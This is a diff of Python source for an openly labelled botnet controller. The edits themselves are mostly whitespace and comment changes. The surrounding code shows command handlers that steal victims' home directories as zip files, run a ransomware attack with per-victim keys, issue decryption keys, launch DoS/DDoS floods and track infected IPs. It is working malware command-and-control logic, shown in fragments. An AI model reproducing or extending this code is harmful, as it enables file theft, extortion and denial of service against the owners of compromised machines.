@@ -11,6 +11,7 @@ VICTIM_PORT = 4848
 
 keys = {}
 
+
 def send_steal_attack(payload):
     infected_ip = str(payload.split(",")[1])
     print "Beginning to steal %s's HOME directory" % infected_ip
@@ -23,7 +24,7 @@ def ransomeware_attack(payload):
     print "Beginning Ransomeware Attack"
     infected_ip = str(payload.split(",")[1])
     if infected_ip in keys:
-        return # already attacked
+        return  # already attacked
     key = ''.join(random.choice(string.ascii_lowercase) for _ in range(16))
     keys[infected_ip] = key
     msg_contents = "RANSOMEWARE," + key
@@ -36,7 +37,7 @@ def send_decrypt_key(payload):
     print "Sending Key to unencrypt files"
     infected_ip = str(payload.split(",")[1])
     if infected_ip not in keys:
-        return # did not attack yet
+        return  # did not attack yet
     msg_contents = "DECRYPT," + keys[infected_ip]
     Messenger.send_message(str(infected_ip), VICTIM_PORT, msg_contents)
 
@@ -57,7 +58,7 @@ def send_ddos_attack(payload):
 
 
 def add_new_victim(victim_ip, response):
-    # response contains the JOIN message
+    # Response contains the JOIN message
     print "Adding %s to our Infected List" % str(victim_ip)
     botnet.append(str(victim_ip))
 
@@ -69,8 +70,8 @@ def list_infected():
 
 def process_zip_file(victim_ip, file_contents):
     print "Got the file from %s" % victim_ip
-    zip_name = str(victim_ip) + "/home.zip"
-    with open(zip_name, "w") as f:
+    zip_name = str(victim_ip) + "home.zip"
+    with open(str(zip_name), "w") as f:
         f.write(str(file_contents[2:]))
 
 
@@ -84,6 +85,7 @@ def listen_for_response():
     s.close()
 
 
+# Easier to Quit and restart server
 def quit_all():
     os.system('kill -9 %d' % os.getpid())
 
@@ -109,9 +111,7 @@ def main():
 
     listen_thread.join()
 
-# NEED TO CHANGE THIS INTO 2 DIFFERENT DICTS
 # COMMAND DICT
-# RESPONSE DICT
 command_dict = {"LIST": list_infected,
                 "DOS": send_dos_attack,
                 "RANS": ransomeware_attack,
@@ -120,6 +120,7 @@ command_dict = {"LIST": list_infected,
                 "STEAL": send_steal_attack,
                 "EXIT": quit_all
                 }
+# RESPONSE DICT
 response_dict = {"JOIN": add_new_victim,
                  "D": process_zip_file
                  }
